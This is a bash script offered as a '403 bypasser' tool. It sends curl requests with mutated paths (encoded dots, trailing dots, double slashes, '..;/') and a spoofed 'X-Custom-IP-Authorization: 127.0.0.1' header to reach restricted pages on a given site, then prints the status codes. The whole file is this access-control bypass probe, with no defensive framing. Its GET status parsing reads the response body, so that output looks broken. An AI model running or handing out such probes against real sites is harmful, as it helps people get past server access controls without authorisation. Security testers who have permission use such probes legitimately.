#!/bin/bash

apt install figlet > /dev/null 2>&1
figlet -c 403 bypasser

echo -e "\n------------------------------------- WELCOME -------------------------------------\n"
echo "This tool is to bypass 403 status code and to reach restricted pages."
echo "HTTP status codes are detected by both GET and HEAD requests."
echo -e "\nUsage: ./bypass_403.sh <url> <directory>"
echo -e "\nExample: ./bypass_403.sh https://google.com maps\n"

re='^[0-9]+$'   #regex for testing, is a number?

echo -e "-----------------------------------------------------------------------------------"

#1-Testing https://url.com/path
get1=$(curl $1/$2 -s | head -n 2 | tail -1 | cut -d " " -f 1 | tr -cd [:digit:])
head1=$(curl $1/$2 -I -s | head -n 1 | cut -d " " -f 2)

url="$1/$2"
len=${#url}
rem=$((50-len))

if [[ $get1 =~ $re ]];then
	echo -n "$1/$2";for((i=1;i<=$rem;i+=1)); do echo -n " "; done;echo -n " --> GET: $get1"
else
	echo -n "$1/$2";for((i=1;i<=$rem;i+=1)); do echo -n " "; done;echo -n " --> GET: ---"
fi

if [[ $head1 =~ $re ]];then
        echo -n -e "\t\tHEAD: $head1"
else
        echo -n -e "\t\tHEAD: ---"
fi


#2-Testing https://url.com/%2e/path
echo -e "\n"
get2=$(curl $1/%2e/$2 -s | head -n 2 | tail -1 | cut -d " " -f 1 | tr -cd [:digit:])
head2=$(curl $1/%2e/$2 -I -s | head -n 1 | cut -d " " -f 2)

url="$1/%2e/$2"
len=${#url}
rem=$((50-len))

if [[ $get2 =~ $re ]];then
        echo -n "$1/%2e/$2";for((i=1;i<=$rem;i+=1)); do echo -n " "; done;echo -n " --> GET: $get2"
else
        echo -n "$1/%2e/$2";for((i=1;i<=$rem;i+=1)); do echo -n " "; done;echo -n " --> GET: ---"
fi

if [[ $head2 =~ $re ]];then
        echo -n -e "\t\tHEAD: $head2"
else
        echo -n -e "\t\tHEAD: ---"
fi


#3-Testing https://url.com/path/.
echo -e "\n"
get3=$(curl $1/$2/. -s | head -n 2 | tail -1 | cut -d " " -f 1 | tr -cd [:digit:])
head3=$(curl $1/$2/. -I -s | head -n 1 | cut -d " " -f 2)

url="$1/$2/."
len=${#url}
rem=$((50-len))

if [[ $get3 =~ $re ]];then
        echo -n "$1/$2/.";for((i=1;i<=$rem;i+=1)); do echo -n " "; done;echo -n " --> GET: $get3"
else
        echo -n "$1/$2/.";for((i=1;i<=$rem;i+=1)); do echo -n " "; done;echo -n " --> GET: ---"
fi

if [[ $head3 =~ $re ]];then
        echo -n -e "\t\tHEAD: $head3"
else
        echo -n -e "\t\tHEAD: ---"
fi


#4-Testing https://url.com//path//
echo -e "\n"
get4=$(curl $1//$2// -s | head -n 2 | tail -1 | cut -d " " -f 1 | tr -cd [:digit:])
head4=$(curl $1//$2// -I -s | head -n 1 | cut -d " " -f 2)

url="$1//$2//"
len=${#url}
rem=$((50-len))

if [[ $get4 =~ $re ]];then
        echo -n "$1//$2//";for((i=1;i<=$rem;i+=1)); do echo -n " "; done;echo -n " --> GET: $get4"
else
        echo -n "$1//$2//";for((i=1;i<=$rem;i+=1)); do echo -n " "; done;echo -n " --> GET: ---"
fi

if [[ $head4 =~ $re ]];then
        echo -n -e "\t\tHEAD: $head4"
else
        echo -n -e "\t\tHEAD: ---"
fi



#5-Testing https://url.com/./path/./
echo -e "\n"
get5=$(curl $1/./$2/./ -s | head -n 2 | tail -1 | cut -d " " -f 1 | tr -cd [:digit:])
head5=$(curl $1/./$2/./ -I -s | head -n 1 | cut -d " " -f 2)

url="$1/./$2/./"
len=${#url}
rem=$((50-len))

if [[ $get5 =~ $re ]];then
        echo -n "$1/./$2/./";for((i=1;i<=$rem;i+=1)); do echo -n " "; done;echo -n " --> GET: $get5"
else
        echo -n "$1/./$2/./";for((i=1;i<=$rem;i+=1)); do echo -n " "; done;echo -n " --> GET: ---"
fi

if [[ $head5 =~ $re ]];then
        echo -n -e "\t\tHEAD: $head5"
else
        echo -n -e "\t\tHEAD: ---"
fi



#6-Testing https://url.com/path/
echo -e "\n"
get6=$(curl $1/$2/ -s | head -n 2 | tail -1 | cut -d " " -f 1 | tr -cd [:digit:])
head6=$(curl $1/$2/ -I -s | head -n 1 | cut -d " " -f 2)

url="$1/$2/"
len=${#url}
rem=$((50-len))

if [[ $get6 =~ $re ]];then
        echo -n "$1/$2/";for((i=1;i<=$rem;i+=1)); do echo -n " "; done;echo -n " --> GET: $get6"
else
        echo -n "$1/$2/";for((i=1;i<=$rem;i+=1)); do echo -n " "; done;echo -n " --> GET: ---"
fi

if [[ $head6 =~ $re ]];then
        echo -n -e "\t\tHEAD: $head6"
else
        echo -n -e "\t\tHEAD: ---"
fi



#7-Testing https://url.com/path..;/
echo -e "\n"
get7=$(curl $1/$2..\;/ -s | head -n 2 | tail -1 | cut -d " " -f 1 | tr -cd [:digit:])
head7=$(curl $1/$2..\;/ -I -s | head -n 1 | cut -d " " -f 2)

url="$1/$2..;/"
len=${#url}
rem=$((50-len))

if [[ $get7 =~ $re ]];then
        echo -n "$1/$2..;/";for((i=1;i<=$rem;i+=1)); do echo -n " "; done;echo -n " --> GET: $get7"
else
        echo -n "$1/$2..;/";for((i=1;i<=$rem;i+=1)); do echo -n " "; done;echo -n " --> GET: ---"
fi

if [[ $head7 =~ $re ]];then
        echo -n -e "\t\tHEAD: $head7"
else
        echo -n -e "\t\tHEAD: ---"
fi



#8-Testing https://url.com/path with header poisoning
echo -e "\n"
get8=$(curl -H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2..\;/ -s | head -n 2 | tail -1 | cut -d " " -f 1 | tr -cd [:digit:])
head8=$(curl -H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2..\;/ -I -s | head -n 1 | cut -d " " -f 2)

url="$1/$2 X-C-IP-Auth"
len=${#url}
rem=$((50-len))

if [[ $get8 =~ $re ]];then
        echo -n "$1/$2 X-C-IP-Auth";for((i=1;i<=$rem;i+=1)); do echo -n " "; done;echo -n " --> GET: $get8"
else
        echo -n "$1/$2 X-C-IP-Auth";for((i=1;i<=$rem;i+=1)); do echo -n " "; done;echo -n " --> GET: ---"
fi

if [[ $head8 =~ $re ]];then
        echo -n -e "\t\tHEAD: $head8"
else
        echo -n -e "\t\tHEAD: ---"
fi



